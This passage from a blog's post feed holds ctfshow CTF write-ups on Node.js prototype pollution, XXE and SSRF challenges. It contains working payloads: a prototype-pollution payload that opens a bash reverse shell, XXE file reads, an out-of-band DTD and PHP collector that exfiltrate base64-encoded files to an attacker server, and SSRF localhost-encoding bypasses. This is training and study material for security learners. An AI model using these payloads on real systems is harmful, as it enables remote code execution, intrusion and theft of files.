class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> utils = <span class="built_in">require</span>(<span class="string">&#x27;../utils/common&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>).<span class="title function_">match</span>(<span class="regexp">/Text/ig</span>))&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;hacker go away&#x27;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br><span class="line">    <span class="keyword">if</span>(user.<span class="property">userinfo</span>.<span class="property">isAdmin</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录成功&#x27;</span>&#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="string">&quot;self&quot;</span>:<span class="number">1</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/xxx 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>和上一题一样</p><h2 id="web344"><a href="#web344" class="headerlink" title="web344()"></a>web344()</h2><p>题目</p><p><img src="../images/image-20230201211803497.png" alt="image-20230201211803497"></p><p>题目给的代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">url</span>.<span class="title function_">match</span>(<span class="regexp">/8c|2c|\,/ig</span>))&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">query</span>.<span class="property">query</span>);</span><br><span class="line">  <span class="keyword">if</span>(query.<span class="property">name</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;query.<span class="property">password</span>===<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.<span class="property">isVIP</span>===<span class="literal">true</span>)&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag. :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>正常就是这样：<code>?query=&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;</code>，但是不行，发现把逗号给过滤了</p><p>HTTP协议中允许同名参数出现多次，不同服务端对同名参数处理都是不一样的，下面链接列举了一些</p><p><a href="https://www.cnblogs.com/AtesetEnginner/p/12375499.html">https://www.cnblogs.com/AtesetEnginner/p/12375499.html</a></p><p>nodejs 会把同名参数以数组的形式存储，并且 <code>JSON.parse</code> 可以正常解析。</p><p>这样传：<code>?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</code></p><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=&#123;%22name%<span class="number">22</span>:%22admin%<span class="number">22</span>&amp;query=%22password%<span class="number">22</span>:%<span class="number">22</span>%63tfshow%<span class="number">22</span>&amp;query=%22isVIP%<span class="number">22</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><p>首先就是node.js处理req.query.query的时候，它不像php那样，后面get传的query值会覆盖前面的，而是会把这些值都放进一个数组中。而JSON.parse居然会把数组中的字符串都拼接到一起，再看满不满足格式，满足就进行解析，因此这样分开来传就可以绕过逗号了。至于c那个之所以要再进行url编码成%63,就是因为前面的%22，会造成%22c，正好ban了2c，所以c也需要进行url编码。学到了学到了，很有意思的特性。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow nodejs 刷题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-xxe 刷题记录</title>
      <link href="/posts/93a17fc8.html"/>
      <url>/posts/93a17fc8.html</url>
      
        <content type="html"><![CDATA[<p>xxe的解释  —-&gt;   <a href="https://xz.aliyun.com/t/3357#toc-24">这篇文章</a>   —-&gt;讲的比较详细了，几乎覆盖了xxe的所有攻击方法</p><p><a href="https://security.tencent.com/index.php/blog/msg/69">这篇文章写的也不错</a> —-&gt;  也是对xxe攻击的解释和介绍</p><h2 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h2><p>题目</p><p><img src="../images/image-20230123174724507.png" alt="image-20230123174724507"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 允许加载外部实体</span></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">// xml文件来源于数据流</span></span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">  <span class="comment">// 加载xml实体，参数为替代实体、加载外部子集</span></span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">  <span class="comment">// 把 DOM 节点转换为 SimpleXMLElement 对象</span></span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">  <span class="comment">// 节点嵌套</span></span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于php为协议  <code>php://input</code>的作用，试所以我们得进行post发包。</p><p>得用bp,hackbar不行</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[POST]Payload:</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">payload</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">payload</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码里的payload  xxe  creds 可以根据自己的情况进行修改，不会影响最终的结果</p><p><code>ctfshow</code>是不能进行修改的   因为题目的<code>echo $ctfshow</code>得需要<code>ctfshow</code></p><p>但是在<code>ENTITY</code>里的<code>xxe</code>必须得和外边的<code>&amp;xxe;</code>相等</p><p><img src="../images/image-20230123180043163.png" alt="image-20230123180043163"></p><p>写进去的时候必须得空一格，因为这个可能是个语法要求。</p><h2 id="web374-376-过滤了xml"><a href="#web374-376-过滤了xml" class="headerlink" title="web374-376(过滤了xml)"></a>web374-376(过滤了xml)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这题相较上题而言，没有了回显   就是<code>echo</code>输出</p><p>所以我们就得进行外带了  得自己准备一个vps</p><p><strong>第一步</strong></p><p>先在自己的服务器上建一个网站，然后给一个端口号</p><p><img src="../images/image-20230123225626535.png" alt="image-20230123225626535"></p><p><strong>第二步</strong></p><p>就开始在网站的根目录下写所需要的文件</p><p>先写一个<strong>pd.dtd</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span></span></span><br><span class="line"><span class="meta"><span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://vsp:端口号/xxe.php?q=%file;&#x27;&gt;&quot;</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">%all;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后写个xxe.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$xxe</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>]);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&#x27;flag.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$txt</span>,<span class="variable">$xxe</span>,FILE_APPEND)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后在写一个flag.txt用来存反弹回来的flag</p><p><img src="../images/image-20230123230041340.png" alt="image-20230123230041340"></p><p>就是可以先拿自己的vps去看一下能不能访问这三个文件，如果能访问的话就进行post发包。</p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://vps:端口号/pd.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">] &gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230123230256902.png" alt="image-20230123230256902"></p><p>如果成功的话，就会在自己的网站根目录看到flag.</p><p><img src="../images/image-20230123230333502.png" alt="image-20230123230333502"></p><p>上面的方法是通杀方法  —-&gt;   题目把xml给过滤掉了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web377"><a href="#web377" class="headerlink" title="web377"></a>web377</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:26:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br></pre></td></tr></table></figure><p>这里是把xml和http都给过滤掉了，那么我们就可以利用python进行编码发包</p><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://xxx&#x27;</span></span><br><span class="line">data = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % dtd SYSTEM &quot;http://xxx/test.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%dtd;</span></span><br><span class="line"><span class="string">%send;</span></span><br><span class="line"><span class="string">] &gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">requests.post(url ,data=data.encode(<span class="string">&#x27;utf-16&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;done!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因为xml支持utf-16编码，所以我们就可以进行utf-16进行编码</p><h2 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h2><p>题目</p><p><img src="../images/image-20230123231807557.png" alt="image-20230123231807557"></p><p>一个xxe的登录，尝试一下弱口令登录，admin/admin   登录成功，没有显示什么，那么我们就可以进行抓包查看。</p><p><img src="../images/image-20230123231949046.png" alt="image-20230123231949046"></p><p>然后就可以进行xxe注入了，这种类型的题目是最经典的，网上有一模一样的。</p><p><img src="../images/image-20230123232139774.png" alt="image-20230123232139774"></p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>这个show讲的xxe类型比较少，想看更详细的可以去看文章开头给的那两篇文章</p><p>libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡  PHP版本并不影响XXE利用。</p>]]></content>
      
      
      
        <tags>
            
            <tag> xxe ctfshow 刷题记录xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-SSRF 刷题记录</title>
      <link href="/posts/f917f043.html"/>
      <url>/posts/f917f043.html</url>
      
        <content type="html"><![CDATA[<p>可以通过这篇文章来了解一下啥是SSRF  ——&gt;   <a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html">https://websec.readthedocs.io/zh/latest/vuln/ssrf.html</a></p><p>(觉得写的不好的话可以自己去网上搜，网上挺多人写的)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">以下内容摘自这篇文章 https://blog.csdn.net/q20010619/article/details/120536552</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SSRF基础</span><br><span class="line">SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">相关函数和类</span><br><span class="line"></span><br><span class="line">file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中</span><br><span class="line">readfile()：输出一个文件的内容</span><br><span class="line">fsockopen()：打开一个网络连接或者一个Unix 套接字连接</span><br><span class="line">curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用</span><br><span class="line">fopen()：打开一个文件文件或者 URL</span><br><span class="line">PHP原生类SoapClient在触发反序列化时可导致SSRF</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">相关协议</span><br><span class="line"></span><br><span class="line">file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</span><br><span class="line">dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</span><br><span class="line">gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</span><br><span class="line">http/s协议：探测内网主机存活</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">利用方式</span><br><span class="line"></span><br><span class="line">1.让服务端去访问相应的网址</span><br><span class="line"></span><br><span class="line">2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</span><br><span class="line"></span><br><span class="line">3.可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件</span><br><span class="line"></span><br><span class="line">4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包&#123;payload&#125;）</span><br><span class="line"></span><br><span class="line">5.攻击内网应用程序（利用跨协议通信技术）</span><br><span class="line"></span><br><span class="line">6.判断内网主机是否存活：方法是访问看是否有端口开放</span><br><span class="line"></span><br><span class="line">7.DoS攻击（请求大文件，始终保持连接keep-alive always）</span><br></pre></td></tr></table></figure><h2 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h2><p>题目</p><p><img src="../images/image-20230120160711692.png" alt="image-20230120160711692"></p><p><strong>ssrf题的关键词就是curl</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*# curl_init — 初始化 cURL 会话*    </span><br><span class="line">*# curl_setopt — 设置一个cURL传输选项* </span><br><span class="line">*# curl_exec — 执行 cURL 会话* </span><br><span class="line">*# curl_close — 关闭 cURL 会话*</span><br></pre></td></tr></table></figure><p>这里扫一下目录可以发现存在flag.php这个文件</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">post: url=http://127.0.0.1/flag.php</span><br><span class="line">或者使用 file 伪协议去读取文件</span><br><span class="line">post: url=file:///var/www/html/flag.php 查看源码</span><br></pre></td></tr></table></figure><h2 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h2><p>题目</p><p><img src="../images/image-20230120161950493.png" alt="image-20230120161950493"></p><p>过滤了一下，但是等于没过滤。。。。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url=http://localhost/flag.php</span><br><span class="line">url=http://127.0.0.1/flag.php</span><br><span class="line">url=http://127.0.1/flag.php</span><br><span class="line">url=http://127.1/flag.php</span><br><span class="line">(转进制的方法也可以  ---&gt; 2进制  16进制  8进制都可以)</span><br></pre></td></tr></table></figure><h2 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h2><p>题目</p><p><img src="../images/image-20230120162659628.png" alt="image-20230120162659628"></p><p>增加了新过滤</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1</span><br><span class="line">十进制整数：url=http://2130706433/flag.php</span><br><span class="line">十六进制：url=http://0x7F.0.0.1/flag.php</span><br><span class="line">八进制：url=http://0177.0.0.1/flag.php</span><br><span class="line">十六进制整数：url=http://0x7F000001/flag.php</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">缺省模式：127.0.0.1写成127.1</span><br><span class="line">CIDR：url=http://127.127.127.127/flag.php</span><br><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://0.0.0.0/flag.php</span><br></pre></td></tr></table></figure><h2 id="web354"><a href="#web354" class="headerlink" 